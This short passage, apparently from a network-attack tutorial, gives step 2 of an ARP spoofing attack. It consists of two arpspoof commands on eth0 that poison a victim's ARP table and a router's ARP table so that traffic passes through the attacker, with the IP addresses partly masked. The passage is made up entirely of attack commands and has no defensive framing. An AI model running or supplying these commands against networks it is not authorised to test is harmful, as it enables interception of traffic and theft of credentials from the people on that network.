Step 2: Launch ARP Spoofing 

🔹Poison Victim’s ARP Table (tell victim that attacker = router):

    arpspoof -i eth0 -t 192.168.1XX 192.168.1XX

🔹Poison Router’s ARP Table (tell router that attacker = victim):

    arpspoof -i eth0 -t 192.168.1XX 192.168.1XX
